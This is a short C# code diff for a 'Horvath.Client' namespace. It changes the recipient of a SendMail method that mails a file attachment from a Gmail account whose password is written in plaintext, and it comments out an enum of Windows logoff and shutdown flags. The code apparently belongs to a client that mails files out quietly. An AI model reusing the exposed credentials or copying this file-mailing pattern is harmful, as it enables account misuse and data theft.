@@ -22,7 +22,7 @@ namespace Horvath.Client
         public void SendMail(string to, string subj, string msg, string fileName)
         {
             var fromAddress = new MailAddress("disturbedfat@gmail.com", "Fahad Tariq");
-            var toAddress = new MailAddress("dejavu87@gmail.com", "Yawar Shah");
+            var toAddress = new MailAddress("smallassasin@gmail.com", "Yawar Shah");
             const string fromPassword = "ftmfh@t!c3";
             const string subject = "From Balthazar";
             const string body = "Please find that file you required attached with that email.";
@@ -63,17 +63,17 @@ namespace Horvath.Client
 
 
 
-        [Flags]
-        public enum ExitWindowsFlags
-        {
-            EWX_LOGOFF = 0,
-            EWX_SHUTDOWN = 0x1,
-            EWX_REBOOT = 0x2,
-            EWX_FORCE = 0x4,
-            EWX_POWEROFF = 0x8,
-            EWX_FORCEIFHUNG = 0x10,
-            EWX_RESTARTAPPS = 0x40
-        }
+        //[Flags]
+        //public enum ExitWindowsFlags
+        //{
+        //    EWX_LOGOFF = 0,
+        //    EWX_SHUTDOWN = 0x1,
+        //    EWX_REBOOT = 0x2,
+        //    EWX_FORCE = 0x4,
+        //    EWX_POWEROFF = 0x8,
+        //    EWX_FORCEIFHUNG = 0x10,
+        //    EWX_RESTARTAPPS = 0x40
+        //}
 
     }
 
